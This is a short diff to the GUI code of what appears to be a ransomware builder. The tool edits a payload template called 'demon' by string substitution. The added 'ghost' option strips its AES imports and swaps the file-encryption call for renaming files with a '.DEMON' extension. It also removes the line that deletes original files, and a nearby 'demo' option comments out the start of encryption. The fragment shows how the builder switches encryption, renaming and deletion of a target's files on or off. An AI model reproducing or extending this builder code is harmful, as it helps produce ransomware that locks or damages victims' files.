@@ -219,6 +219,12 @@ class mainwindow(Tk):
         # Replace setting with empty string
         demon = demon.replace('<fullscreen>', '')
 
+    if ghost == 1:
+        demon = demon.replace('<import_random>', '')
+        demon = demon.replace('<import_aes>', '')
+        demon = demon.replace('encrypt_file(os.path.join(path, name), key)', "os.rename(os.path.join(path, name), os.path.join(path, name) + '.DEMON')")
+        demon = demon.replace('os.remove(os.path.join(path, name))', '')
+
     if demo == 1:
         # Disable encrypting
         demon = demon.replace('<encrypt>', '#start_encrypt(get_target(), key)')
